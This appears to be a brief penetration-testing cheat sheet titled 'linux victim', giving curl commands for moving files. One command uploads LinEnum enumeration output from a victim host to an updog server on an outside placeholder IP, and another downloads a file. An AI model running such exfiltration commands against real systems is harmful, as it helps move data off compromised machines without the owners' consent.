# linux victim

## post file to updog

```bash
curl -v -XPOST -F "file=@/tmp/linenum.txt;filename=linenum.txt" -F "path=/home/kali" http://so.me.ip.at:9090/upload
```

## download files with curl

```bash
curl http://localhost:9090/file -o output.file
```

